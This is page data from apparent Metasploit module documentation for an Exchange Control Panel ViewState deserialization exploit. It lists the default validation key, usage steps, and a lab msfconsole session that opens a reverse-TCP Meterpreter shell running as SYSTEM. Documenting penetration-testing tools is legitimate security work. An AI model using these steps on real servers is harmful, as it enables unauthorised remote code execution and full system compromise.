{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/exchange_ecp_viewstate","result":{"data":{"moduleMetadataJson":{"id":"0ac30af7-97d6-589b-a44f-fe07be521ff1","name":"Exchange Control Panel ViewState Deserialization","fullname":"exploit/windows/http/exchange_ecp_viewstate","description":"This module exploits a .NET serialization vulnerability in the\n        Exchange Control Panel (ECP) web page. The vulnerability is due to\n        Microsoft Exchange Server not randomizing the keys on a\n        per-installation basis resulting in them using the same validationKey\n        and decryptionKey values. With knowledge of these values, an attacker\n        can craft a special ViewState to cause an OS command to be executed\n        by NT_AUTHORITY\\SYSTEM using .NET deserialization.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/exchange_ecp_viewstate","documentationSlug":"/modules/documentation/exploit/windows/http/exchange_ecp_viewstate","referencesSlug":"/modules/references/exploit/windows/http/exchange_ecp_viewstate"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a .NET serialization vulnerability in the Exchange Control\nPanel (ECP) web page. The vulnerability is due to Microsoft Exchange Server not\nrandomizing the keys on a per-installation basis resulting in them using the\nsame validationKey and decryptionKey values. With knowledge of these values, an\nattacker can craft a special viewstate to cause an OS command to be executed by\nNT_AUTHORITY\\SYSTEM using .NET deserialization.</p>\n<p>The default ViewState validation key is: <code class=\"language-text\">cb2721abdaf8e9dc516d621d8b8bf13a2c9e8689a25303bf</code>.</p>\n<p>This module requires the user to authenticate to Exchange. At a minimum the user\nmust be a member of the <code class=\"language-text\">Domain Users</code> group and have a mailbox configured on\nthe Exchange server.</p>\n<p>The crafted ViewState must be submitted to the server in a GET request (POST\nrequests will not work) which introduces a size restriction on the contents. Due\nto this, OS commands are limited to a length of approximately 450 which accounts\nfor the overhead of the serialization data. The OS command must also be XML\nencoded which increases the size as well. The .NET deserialization used is the\n\"TextFormattingRunProperties\" chain from the <a href=\"https://github.com/pwntester/ysoserial.net\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ysoserial.net</a> project.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/exchange_ecp_viewstate</code></li>\n<li>Set the <code class=\"language-text\">RHOSTS</code>, <code class=\"language-text\">USERNAME</code> and <code class=\"language-text\">PASSWORD</code> options</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"username\" style=\"position:relative;\"><a href=\"#username\" aria-label=\"username permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>USERNAME</h3>\n<p>Username to log in with</p>\n<h3 id=\"password\" style=\"position:relative;\"><a href=\"#password\" aria-label=\"password permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Password</h3>\n<p>Password to log in with</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"exchange-2016-on-server-2012-x64\" style=\"position:relative;\"><a href=\"#exchange-2016-on-server-2012-x64\" aria-label=\"exchange 2016 on server 2012 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exchange 2016 on Server 2012 x64</h3>\n<p>  For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/http/exchange_ecp_viewstate\nmsf5 exploit(windows/http/exchange_ecp_viewstate) &gt; set RHOSTS 192.168.159.129\nRHOSTS =&gt; 192.168.159.129\nmsf5 exploit(windows/http/exchange_ecp_viewstate) &gt; set USERNAME msflab.local\\\\jdoe\nUSERNAME =&gt; msflab.local\\jdoe\nmsf5 exploit(windows/http/exchange_ecp_viewstate) &gt; set PASSWORD Password1\nPASSWORD =&gt; Password1\nmsf5 exploit(windows/http/exchange_ecp_viewstate) &gt; set TARGET 1\nTARGET =&gt; 1\nmsf5 exploit(windows/http/exchange_ecp_viewstate) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/exchange_ecp_viewstate) &gt; set LHOST 192.168.159.128\nLHOST =&gt; 192.168.159.128\nmsf5 exploit(windows/http/exchange_ecp_viewstate) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.159.128:4444 \n[*] Command Stager progress -   3.61% done (449/12424 bytes)\n[*] Command Stager progress -   7.23% done (898/12424 bytes)\n[*] Command Stager progress -  10.84% done (1347/12424 bytes)\n[*] Command Stager progress -  14.46% done (1796/12424 bytes)\n[*] Command Stager progress -  18.07% done (2245/12424 bytes)\n[*] Command Stager progress -  21.68% done (2694/12424 bytes)\n[*] Command Stager progress -  25.30% done (3143/12424 bytes)\n[*] Command Stager progress -  28.91% done (3592/12424 bytes)\n[*] Command Stager progress -  32.53% done (4041/12424 bytes)\n[*] Command Stager progress -  36.14% done (4490/12424 bytes)\n[*] Command Stager progress -  39.75% done (4939/12424 bytes)\n[*] Command Stager progress -  43.37% done (5388/12424 bytes)\n[*] Command Stager progress -  46.98% done (5837/12424 bytes)\n[*] Command Stager progress -  50.60% done (6286/12424 bytes)\n[*] Command Stager progress -  54.21% done (6735/12424 bytes)\n[*] Command Stager progress -  57.82% done (7184/12424 bytes)\n[*] Command Stager progress -  61.44% done (7633/12424 bytes)\n[*] Command Stager progress -  65.05% done (8082/12424 bytes)\n[*] Command Stager progress -  68.67% done (8531/12424 bytes)\n[*] Command Stager progress -  72.28% done (8980/12424 bytes)\n[*] Command Stager progress -  75.89% done (9429/12424 bytes)\n[*] Command Stager progress -  79.51% done (9878/12424 bytes)\n[*] Command Stager progress -  82.74% done (10279/12424 bytes)\n[*] Command Stager progress -  86.15% done (10703/12424 bytes)\n[*] Command Stager progress -  89.43% done (11111/12424 bytes)\n[*] Command Stager progress -  92.91% done (11543/12424 bytes)\n[*] Command Stager progress -  96.28% done (11962/12424 bytes)\n[*] Sending stage (206403 bytes) to 192.168.159.129\n[*] Command Stager progress -  99.84% done (12404/12424 bytes)\n[*] Meterpreter session 1 opened (192.168.159.128:4444 -&gt; 192.168.159.129:17626) at 2020-03-02 10:40:52 -0500\n[*] Command Stager progress - 100.00% done (12424/12424 bytes)\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : EXCHANGE\nOS              : Windows 2012 R2 (6.3 Build 9600).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : MSFLAB\nLogged On Users : 9\nMeterpreter     : x64/windows\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"0ac30af7-97d6-589b-a44f-fe07be521ff1"}}}